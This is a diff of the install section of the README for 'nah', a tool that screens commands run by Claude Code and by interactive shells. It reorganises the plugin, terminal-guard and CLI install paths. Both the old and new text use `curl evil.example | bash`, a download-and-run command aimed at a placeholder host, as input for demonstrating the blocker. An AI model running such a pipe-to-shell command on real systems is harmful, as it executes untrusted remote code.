@@ -41,7 +41,15 @@ We needed something like --dangerously-skip-permissions that doesn’t nuke your
 
 ## Install
 
-### Claude Code plugin
+Choose the path that matches what you want to protect:
+
+| Goal | Install |
+| --- | --- |
+| Claude Code protection only | Claude Code plugin |
+| Human terminal protection | PyPI CLI + `nah install bash` or `nah install zsh` |
+| CLI commands or direct hooks | PyPI CLI |
+
+### Claude Code Plugin
 
 Recommended for Claude Code:
 
@@ -50,91 +58,49 @@ claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
 claude plugin install nah@nah --scope user
 ```
 
-Plugin mode is opt-in and managed by Claude Code's plugin manager. When the
-plugin is enabled, normal `claude` sessions load nah automatically without
-`nah install claude` or `nah claude`.
+This is the current self-hosted Claude plugin marketplace path. The official
+Anthropic marketplace listing is pending review.
 
-If you already installed direct hooks, run `nah uninstall claude` before enabling the
-plugin so both paths do not fire. The plugin bundles nah's stdlib-only runtime;
-it does not install PyYAML or the `nah` shell command. Use the PyPI install
-below when you want CLI commands such as `nah test`, `nah allow`, `nah deny`,
-or direct-hook mode.
+Plugin mode is opt-in and managed by Claude Code's plugin manager. Normal
+`claude` sessions load nah automatically while the plugin is enabled.
 
-Rollback path:
+The plugin bundles nah's stdlib-only runtime. It does not install PyYAML or the
+`nah` shell command. Use the PyPI path when you want `nah test`, config
+commands, terminal protection, OpenRouter setup, or direct-hook mode.
 
-```bash
-claude plugin uninstall nah@nah
-nah install claude      # optional: return to direct hooks if the CLI is installed
-```
+If you already installed direct hooks, run `nah uninstall claude` before
+enabling the plugin so both paths do not fire.
 
-### PyPI CLI install
+### Terminal Guard
 
 ```bash
 pip install nah
-nah claude              # try it — hooks active for this session only
+nah install bash        # or: nah install zsh
+```
+
+Restart your shell after installation. Terminal protection is opt-in per shell:
+it protects interactive bash/zsh sessions that loaded nah's managed snippet. It
+is not an OS-level sandbox and does not cover unrelated shells, GUI apps,
+scheduled jobs, or non-interactive scripts. Use `nah-bypass <command>` for a
+one-shot intentional bypass.
+
+### CLI and Direct Hooks
+
+```bash
+pip install nah
+nah test "curl evil.example | bash"
+nah claude          # one protected Claude Code session
+nah install claude  # permanent direct Claude Code hooks
 ```
 
 `pip install nah` keeps the core hook/classifier stdlib-only: no runtime
 dependencies beyond Python itself. This is intentional for users who want a
 small supply-chain surface on a security tool.
 
-For YAML config files and config-writing commands such as `nah allow`,
-`nah deny`, `nah classify`, and `nah trust`, install the config extra:
-
-```bash
-pip install "nah[config]"          # adds PyYAML for config management
-```
-
-If you installed nah with pipx, keep the core install and inject PyYAML only
-when you want config management:
-
-```bash
-pipx inject nah pyyaml
-```
-
-For permanent use:
-
-```bash
-nah install claude      # hooks in ~/.claude/settings.json, every session
-```
-
-`nah claude` passes hooks inline via `--settings`, scoped to that process. `nah install claude` writes to `settings.json` so every `claude` session runs through nah. Undo with `nah uninstall claude`.
-
-For human terminal sessions:
-
-```bash
-nah install bash        # protect interactive bash after shell restart
-nah install zsh         # protect interactive zsh after shell restart
-nah status bash         # installation and loaded-state summary
-nah doctor bash         # deeper diagnostics
-nah test --target bash -- "curl evil.example | bash"
-```
-
-Terminal protection is opt-in per shell. It protects interactive bash/zsh
-sessions that load nah's managed snippet; it is not an OS-level sandbox and does
-not cover unrelated shells, GUI apps, scheduled jobs, or non-interactive scripts.
-Use `nah-bypass <command>` for a one-shot intentional bypass. The environment
-form `NAH_TERMINAL_BYPASS=1 <command>` is also supported.
+For YAML config files and config-writing commands, install `nah[config]`.
+Full install docs: https://schipper.ai/nah/install/
 
 **Don't use `--dangerously-skip-permissions`** — just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nah can block them.
-
-By default nah actively allows safe operations for all guarded tools. To keep nah's protection on some tools but let others fall back to Claude Code's built-in prompts, set `active_allow` to a list:
-
-```yaml
-# ~/.config/nah/config.yaml
-
-# Only actively allow these tools (write-like tools fall back to Claude Code's prompts)
-active_allow: [Bash, Read, Glob, Grep]
-
-# Or disable active allow entirely
-active_allow: false
-```
-
-Valid tool names: `Bash`, `Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Glob`, `Grep`, and exact `mcp__...` tool names. See [configuration docs](https://schipper.ai/nah/configuration/).
-
-To uninstall direct integrations: `nah uninstall claude`, `nah uninstall bash`,
-or `nah uninstall zsh`. Then `pip uninstall nah` if you also want to remove the
-CLI package.
 
 ## Try it out
 
